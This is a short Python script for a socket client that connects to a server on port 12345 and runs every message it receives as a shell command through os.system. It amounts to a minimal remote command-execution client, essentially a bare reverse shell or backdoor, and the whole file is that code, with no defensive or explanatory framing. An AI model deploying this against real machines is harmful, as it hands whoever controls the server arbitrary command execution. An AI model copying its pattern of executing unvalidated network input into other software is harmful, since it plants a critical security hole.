import os
import socket

host = socket.gethostname()
port = 12345

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    try:
        while True:
            message = client.recv(1024).decode()
            os.system(str(message))
            print("Server:", message)
    except KeyboardInterrupt:
        print("\nClient shutting down...")
        client.close()

if __name__ == "__main__":
    main()
